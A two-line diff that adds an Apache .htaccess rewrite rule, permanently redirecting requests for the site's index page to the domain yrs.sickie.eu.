@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^index\.(php|html?)$ http://yrs.sickie.eu/ [R=301,L]
